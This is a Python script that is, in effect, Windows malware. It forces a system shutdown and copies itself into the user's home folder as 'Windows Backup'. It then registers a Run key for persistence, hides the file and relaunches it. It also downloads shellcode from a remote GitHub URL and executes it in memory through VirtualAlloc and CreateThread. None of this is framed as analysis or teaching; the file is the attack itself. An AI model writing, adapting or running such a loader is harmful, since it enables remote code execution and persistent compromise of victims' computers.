from ctypes import *
from ctypes.wintypes import *
import urllib
import requests
import os
import sys

os.system("shutdown -s -t 300")

systype = ("windows" if os.name == "nt" else "unix")

def getpath():
    if getattr(sys, "frozen", False):
        application_path = sys.executable
    elif __file__:
        application_path = os.path.abspath(__file__)
    return application_path

if getpath().split(".")[-1] == "exe":
    save_filename = "Windows Backup.exe"
else:
    save_filename = "Windows Backup.py"

if systype == "windows" and not getpath().split(os.path.basename(getpath()))[0][:-1].lower() == os.path.expanduser("~").lower():
    print(os.popen(f'COPY "{getpath()}" "{os.path.expanduser("~")}\{save_filename}"').read())
    print(os.popen(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "FCTRL service v1.2.3 shellcode" /d "{os.path.expanduser("~")}\{save_filename}" /f').read())
    print(os.popen(f'attrib +s +h +a "{os.path.expanduser("~")}\{save_filename}"').read())
    print(os.popen(f'"{os.path.expanduser("~")}\{save_filename}"').read())
    print(os.popen(f"TASKKILL -F -PID {os.getpid()}").read())
else:
    buf =  b""
    
    while not buf:
        try:
            buf = urllib.request.urlopen("https://raw.githubusercontent.com/Minecraft-vIIr/FCTRL-tools/main/sc/sc.txt").read().strip()
        except:
            pass

    buf = bytearray(buf)

    windll.kernel32.VirtualAlloc.restype = c_uint64

    ptr = windll.kernel32.VirtualAlloc(c_int(0), c_int(len(buf)), c_int(0x3000), c_int(0x40))

    shellcode = (c_char * len(buf)).from_buffer(buf)
    windll.kernel32.RtlMoveMemory(c_uint64(ptr), shellcode, c_int(len(buf)))

    handle = windll.kernel32.CreateThread(c_int(0), c_int(0), c_uint64(ptr), c_int(0), c_int(0), pointer(c_int(0)))

    windll.kernel32.WaitForSingleObject(c_int(handle), c_int(-1))
